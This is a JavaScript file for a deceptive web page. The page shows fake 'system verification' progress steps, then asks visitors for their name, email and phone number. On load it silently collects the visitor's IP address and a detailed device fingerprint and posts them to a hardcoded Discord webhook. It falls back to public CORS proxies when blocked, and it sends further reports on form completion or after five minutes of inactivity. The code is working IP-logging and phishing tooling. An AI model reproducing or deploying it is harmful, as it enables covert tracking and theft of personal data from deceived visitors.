const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';

let loadingProgress = 0;
let userIP = '';
let initialWebhookSent = false;
let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
let formStartTime = Date.now();
let inactivityTimer = null;
const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes

// Store session data in localStorage as backup
function storeSessionData() {
    const sessionData = {
        sessionId: sessionId,
        ip: userIP,
        startTime: formStartTime,
        initialWebhookSent: initialWebhookSent,
        lastActivity: Date.now()
    };
    
    try {
        localStorage.setItem('userSession_' + sessionId, JSON.stringify(sessionData));
        console.log('💾 Session data stored in localStorage');
    } catch (error) {
        console.error('❌ Failed to store session data:', error);
    }
}

// Setup inactivity monitoring
function setupInactivityMonitoring() {
    // Reset timer on user activity
    const resetTimer = () => {
        if (inactivityTimer) {
            clearTimeout(inactivityTimer);
        }
        
        inactivityTimer = setTimeout(() => {
            console.log('⏰ Inactivity timeout reached');
            handleIncompleteSession();
        }, INACTIVITY_TIMEOUT);
        
        // Update last activity time
        storeSessionData();
    };
    
    // Monitor user activity
    ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'].forEach(event => {
        document.addEventListener(event, resetTimer, true);
    });
    
    // Start the timer
    resetTimer();
}

// Handle incomplete session (user didn't complete form)
function handleIncompleteSession() {
    console.log('📝 Handling incomplete session...');
    
    // Send final webhook with just the information we have
    sendIncompleteSessionWebhook();
    
    // Show a message to the user
    showIncompleteSessionMessage();
}

// Send webhook for incomplete session
async function sendIncompleteSessionWebhook() {
    if (!userIP || userIP === 'Unknown IP') {
        console.log('❌ No IP information to send');
        return;
    }
    
    try {
        const deviceInfo = getDeviceInfo();
        const sessionDuration = Date.now() - formStartTime;
        
        const embed = {
            title: '⚠️ Incomplete Session',
            description: '👤 User visited but did not complete the form',
            color: 0xff9500, // Orange color for incomplete
            fields: [
                { name: '🆔 Session ID', value: sessionId, inline: false },
                { name: '🌐 IP Address', value: userIP, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                { name: '🌍 Language', value: deviceInfo.language, inline: true },
                { name: '🕐 Session Duration', value: formatDuration(sessionDuration), inline: true },
                { name: '📝 Status', value: '❌ Form not completed', inline: false },
                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
            ],
            footer: {
                text: 'Session ended without form completion - IP information preserved'
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📤 Sending incomplete session webhook...');
        const success = await trySendWebhookMethods(payload);
        
        if (success) {
            console.log('✅ Incomplete session webhook sent successfully');
        } else {
            console.error('❌ Failed to send incomplete session webhook');
        }
        
    } catch (error) {
        console.error('❌ Error sending incomplete session webhook:', error);
    }
}

// Format duration for display
function formatDuration(milliseconds) {
    const seconds = Math.floor(milliseconds / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
    } else if (minutes > 0) {
        return `${minutes}m ${seconds % 60}s`;
    } else {
        return `${seconds}s`;
    }
}

// Show message for incomplete session
function showIncompleteSessionMessage() {
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: rgba(255, 149, 0, 0.9);
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 10000;
        max-width: 300px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    `;
    message.innerHTML = `
        <strong>⏰ Session Timeout</strong><br>
        Your session has ended due to inactivity.<br>
        <small>Your IP information has been recorded.</small>
    `;
    
    document.body.appendChild(message);
    
    // Remove message after 5 seconds
    setTimeout(() => {
        if (message.parentNode) {
            message.parentNode.removeChild(message);
        }
    }, 5000);
}

const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

function getMobileDeviceType() {
    const userAgent = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(userAgent)) {
        return 'iOS Device';
    } else if (/Android/i.test(userAgent)) {
        return 'Android Device';
    } else if (/Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile Device';
    } else {
        return 'Desktop/Laptop';
    }
}

function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function validatePhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    return cleaned.length >= 8 && cleaned.length <= 15;
}

function formatPhoneNumber(phone) {
    const cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.length <= 3) {
        return cleaned;
    } else if (cleaned.length <= 6) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    } else if (cleaned.length <= 10) {
        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
    } else {
        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = `${window.screen.colorDepth} bit`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const timestamp = new Date().toISOString();
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
    const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
    const mobileDeviceType = getMobileDeviceType();

    return {
        userAgent,
        platform,
        language,
        screenRes,
        colorDepth,
        timezone,
        timestamp,
        deviceMemory,
        cpuCores,
        isMobile,
        browser,
        os,
        mobileDeviceType
    };
}

async function sendWebhook(userData) {
    console.log('🚀 Starting completion webhook send process...');
    console.log('📋 User data:', userData);
    console.log('🆔 Session ID:', sessionId);
    
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        // Use the IP we already collected
        const ip = userIP || 'Unknown IP';
        console.log('🌐 Using collected IP:', ip);

        console.log('📱 Getting device info...');
        const deviceInfo = getDeviceInfo();
        console.log('📊 Device info collected:', deviceInfo);

        console.log('🔧 Building completion webhook payload...');
        const embed = {
            title: '✅ User Information Completed',
            description: '👤 User successfully completed the information form',
            color: 0x00ff00, // Green color for completion
            fields: [
                { name: '🆔 Session ID', value: sessionId, inline: false },
                { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
                { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
                { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                { name: '🌍 Language', value: deviceInfo.language, inline: true },
                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
                { name: '🕐 Completion Time', value: deviceInfo.timestamp, inline: false },
                { name: '📝 Status', value: '✅ User information successfully submitted', inline: false },
                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
            ],
            footer: {
                text: 'Form completed successfully - user provided all requested information'
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📤 Preparing to send completion webhook...');
        console.log('📦 Completion payload:', JSON.stringify(payload, null, 2));
        
        // Try multiple methods to send webhook
        const success = await trySendWebhookMethods(payload);
        
        if (success) {
            console.log('✅ Completion webhook sent successfully');
        } else {
            console.error('❌ Failed to send completion webhook');
        }
        
        return success;
        
    } catch (error) {
        console.error('❌ Error in completion webhook process:', error);
        console.error('❌ Error details:', error.message);
        return false;
    }
}

async function trySendWebhookMethods(payload) {
    // Method 1: Direct fetch (works when served from web server)
    console.log('🔄 Method 1: Trying direct fetch...');
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Direct fetch response status:', response.status);
        
        if (response.ok) {
            console.log('✅ Direct fetch succeeded!');
            return true;
        }
    } catch (error) {
        console.log('❌ Direct fetch failed:', error.message);
    }
    
    // Method 2: Working CORS proxy (for local file access)
    console.log('🔄 Method 2: Trying CORS proxy...');
    try {
        const corsProxy = 'https://corsproxy.io/?';
        const proxyUrl = corsProxy + encodeURIComponent(WEBHOOK_URL);
        
        console.log('🌐 Using proxy URL:', proxyUrl);
        
        const response = await fetch(proxyUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Proxy response status:', response.status);
        
        if (response.ok) {
            console.log('✅ CORS proxy succeeded!');
            return true;
        } else {
            const errorText = await response.text();
            console.error('❌ Proxy failed. Status:', response.status, 'Response:', errorText);
        }
    } catch (error) {
        console.log('❌ CORS proxy failed:', error.message);
    }
    
    // Method 3: Alternative CORS proxy
    console.log('🔄 Method 3: Trying alternative CORS proxy...');
    try {
        const altProxy = 'https://thingproxy.freeboard.io/fetch/';
        const proxyUrl = altProxy + WEBHOOK_URL;
        
        console.log('🌐 Using alternative proxy URL:', proxyUrl);
        
        const response = await fetch(proxyUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        
        console.log('📡 Alternative proxy response status:', response.status);
        
        if (response.ok) {
            console.log('✅ Alternative proxy succeeded!');
            return true;
        }
    } catch (error) {
        console.log('❌ Alternative proxy failed:', error.message);
    }
    
    // Method 4: Fallback - Store data locally and show manual send option
    console.log('🔄 Method 4: Fallback method...');
    try {
        // Store the data in localStorage for manual retrieval
        const storedData = {
            payload: payload,
            timestamp: new Date().toISOString(),
            webhookUrl: WEBHOOK_URL
        };
        
        localStorage.setItem('pendingWebhookData', JSON.stringify(storedData));
        console.log('💾 Data stored in localStorage for manual retrieval');
        
        // Show manual send instructions
        showManualSendInstructions(payload);
        
        return true; // Consider it successful since data is preserved
    } catch (error) {
        console.error('❌ Fallback method failed:', error);
    }
    
    console.error('❌ All webhook methods failed');
    return false;
}

function showManualSendInstructions(payload) {
    console.log('📋 === MANUAL SEND INSTRUCTIONS ===');
    console.log('📦 Copy this payload and send it manually:');
    console.log(JSON.stringify(payload, null, 2));
    console.log('🌐 Send to:', WEBHOOK_URL);
    console.log('🛠️ Use curl or Postman to send:');
    console.log(`curl -X POST -H "Content-Type: application/json" -d '${JSON.stringify(payload).replace(/'/g, '\\\'')}' ${WEBHOOK_URL}`);
    console.log('📋 === END MANUAL INSTRUCTIONS ===');
    
    // Also show in a user-friendly way
    alert('Webhook could not be sent automatically due to browser restrictions.\n\nPlease check the browser console (F12) for manual send instructions.\n\nYour data has been saved locally and will not be lost.');
}

function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    progressFill.style.width = percentage + '%';
    
    if (percentage >= 100) {
        progressText.textContent = 'System ready!';
    }
}

function updateStatusItem(statusId, icon, text, isActive = false, isCompleted = false) {
    const statusItem = document.getElementById(statusId);
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

async function startLoadingSequence() {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Hide loading screen and show verification screen
    console.log('🔄 Transitioning from loading screen to verification screen...');
    const loadingScreen = document.getElementById('loading-screen');
    const verificationScreen = document.getElementById('verification-screen');
    
    if (loadingScreen && verificationScreen) {
        loadingScreen.style.display = 'none';
        verificationScreen.style.display = 'flex';
        console.log('✅ Successfully transitioned to verification screen');
    } else {
        console.error('❌ Failed to find loading screen or verification screen elements');
        console.log('  - loadingScreen:', loadingScreen ? '✅ Found' : '❌ Missing');
        console.log('  - verificationScreen:', verificationScreen ? '✅ Found' : '❌ Missing');
    }
    
    // Get form elements
    const nameInput = document.getElementById('user-name');
    const emailInput = document.getElementById('user-email');
    const phoneInput = document.getElementById('user-phone');
    const submitBtn = document.getElementById('submit-info');
    const nameError = document.getElementById('name-error');
    const emailError = document.getElementById('email-error');
    const phoneError = document.getElementById('phone-error');
    
    // Check if all elements exist
    console.log('📋 Form elements check:');
    console.log('  - nameInput:', nameInput ? '✅ Found' : '❌ Missing');
    console.log('  - emailInput:', emailInput ? '✅ Found' : '❌ Missing');
    console.log('  - phoneInput:', phoneInput ? '✅ Found' : '❌ Missing');
    console.log('  - submitBtn:', submitBtn ? '✅ Found' : '❌ Missing');
    console.log('  - nameError:', nameError ? '✅ Found' : '❌ Missing');
    console.log('  - emailError:', emailError ? '✅ Found' : '❌ Missing');
    console.log('  - phoneError:', phoneError ? '✅ Found' : '❌ Missing');
    
    // Clear errors on input
    nameInput.addEventListener('input', function() {
        nameError.classList.remove('show');
        nameInput.classList.remove('error');
    });
    
    emailInput.addEventListener('input', function() {
        emailError.classList.remove('show');
        emailInput.classList.remove('error');
    });
    
    phoneInput.addEventListener('input', function(e) {
        const formatted = formatPhoneNumber(e.target.value);
        e.target.value = formatted;
        phoneError.classList.remove('show');
        phoneInput.classList.remove('error');
    });
    
    submitBtn.addEventListener('click', async function() {
        console.log('🚀 Submit button clicked!');
        
        const name = nameInput.value.trim();
        const email = emailInput.value.trim();
        const phone = phoneInput.value.trim();
        
        console.log('📋 Form data:');
        console.log('  - Name:', name);
        console.log('  - Email:', email);
        console.log('  - Phone:', phone);
        
        let hasError = false;
        
        // Validate name
        if (!name || name.length < 2) {
            nameError.textContent = 'Please enter your full name';
            nameError.classList.add('show');
            nameInput.classList.add('error');
            hasError = true;
        }
        
        // Validate email
        if (!validateEmail(email)) {
            emailError.textContent = 'Please enter a valid email address';
            emailError.classList.add('show');
            emailInput.classList.add('error');
            hasError = true;
        }
        
        // Validate phone
        if (!validatePhoneNumber(phone)) {
            phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
            phoneError.classList.add('show');
            phoneInput.classList.add('error');
            hasError = true;
        }
        
        if (hasError) {
            return;
        }
        
        // Disable button and show loading state
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitting...';
        
        // Prepare user data
        const userData = {
            name: name,
            email: email,
            phone: phone
        };

        try {
            console.log(' About to send webhook...');
            const webhookSuccess = await sendWebhook(userData);
            console.log(' Webhook result:', webhookSuccess);

            if (webhookSuccess) {
                console.log(' Webhook successful, showing success screen');
                document.getElementById('verification-screen').style.display = 'none';
                document.getElementById('success-screen').style.display = 'flex';
            } else {
                console.log(' Webhook failed, showing error');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit Information';
                alert('Failed to send your information. Please try again.');
            }

            setTimeout(() => {
                console.log('Information submission process completed');
            }, 3000);
        } catch (error) {
            console.error('Error during submission:', error);

            
            // Show error message to user
            alert('There was an error submitting your information. Please try again.');
            
            // Re-enable the button
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit Information';
        }
    });
    
    // Allow Enter key submission
    [nameInput, emailInput, phoneInput].forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
    });
}

window.addEventListener('load', function() {
    console.log('🚀 Application loaded');
    console.log('🆔 Session ID:', sessionId);
    
    // Setup inactivity monitoring
    setupInactivityMonitoring();
    
    // Start loading sequence immediately (don't wait for IP collection)
    startLoadingSequence();
    setupInfoForm();
    
    // Collect IP and send initial webhook in the background (non-blocking)
    setTimeout(() => {
        collectIPAndSendInitialWebhook();
    }, 100); // Small delay to ensure loading sequence starts first
});

// Collect IP and send initial webhook with just IP and device info
async function collectIPAndSendInitialWebhook() {
    console.log('🌐 Starting IP collection and initial webhook...');
    
    try {
        // Get IP address
        console.log('📡 Getting IP address...');
        userIP = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                console.log('✅ IP retrieved:', data.ip);
                return data.ip;
            })
            .catch(error => {
                console.error('❌ Failed to get IP:', error);
                return 'Unknown IP';
            });
        
        // Get device info
        console.log('📱 Getting device info...');
        const deviceInfo = getDeviceInfo();
        
        // Send initial webhook with just IP and device info
        console.log('📤 Sending initial webhook with IP and device info...');
        const initialSuccess = await sendInitialWebhook(userIP, deviceInfo);
        
        if (initialSuccess) {
            initialWebhookSent = true;
            console.log('✅ Initial webhook sent successfully');
        } else {
            console.error('❌ Failed to send initial webhook');
        }
        
    } catch (error) {
        console.error('❌ Error in initial webhook process:', error);
    }
}

// Send initial webhook with IP and device info
async function sendInitialWebhook(ip, deviceInfo) {
    if (!WEBHOOK_URL) {
        console.error('❌ Webhook URL is not configured');
        return false;
    }
    
    try {
        const embed = {
            title: '🌐 User Visit Detected',
            description: '👤 A user has accessed the system',
            color: 0x3498db, // Blue color for initial visit
            fields: [
                { name: '🆔 Session ID', value: sessionId, inline: false },
                { name: '🌐 IP Address', value: ip, inline: true },
                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                { name: '🌍 Language', value: deviceInfo.language, inline: true },
                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
                { name: '🕐 Visit Time', value: deviceInfo.timestamp, inline: false },
                { name: '📝 Status', value: '⏳ Awaiting user information submission...', inline: false }
            ],
            footer: {
                text: 'Initial visit detected - waiting for user to complete form'
            }
        };

        const payload = {
            embeds: [embed]
        };
        
        console.log('📦 Initial webhook payload prepared');
        
        // Try to send webhook
        return await trySendWebhookMethods(payload);
        
    } catch (error) {
        console.error('❌ Error sending initial webhook:', error);
        return false;
    }
}
